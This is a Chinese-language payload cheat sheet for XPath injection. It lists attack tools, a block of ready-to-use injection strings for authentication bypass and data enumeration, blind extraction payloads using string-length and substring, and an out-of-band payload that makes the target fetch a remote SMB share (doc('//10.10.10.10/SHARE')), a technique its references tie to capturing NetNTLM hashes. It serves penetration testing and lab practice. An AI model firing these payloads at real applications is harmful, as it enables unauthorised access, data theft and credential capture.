[原文文档](README.en.md)

# XPATH Injection

> XPath注入是一种攻击技术，用于利用那些从用户提供的输入构造XPath（XML Path Language）查询来查询或导航XML文档的应用程序。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
    * [盲利用](#盲利用)
    * [带外利用](#带外利用)
* [实验室](#实验室)
* [参考资料](#参考资料)

## 工具

* [orf/xcat](https://github.com/orf/xcat) - 自动化XPath注入攻击以检索文档
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - 高级XPath注入工具
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - 使用预测文本的xxxpwn分支
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath注入利用工具

## 方法论

类似于SQL注入，您想要正确终止查询：

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### 盲利用

1. 字符串的长度

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. 使用`substring`访问字符，并使用`codepoints-to-string`函数验证其值

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### 带外利用

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## 实验室

* [Root Me - XPath注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath注入 - 字符串](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## 参考资料

* [窃取NetNTLM哈希的有趣位置 - Osanda Malith Jayathissa - 2017年3月24日](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPATH注入 - OWASP - 2015年1月21日](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))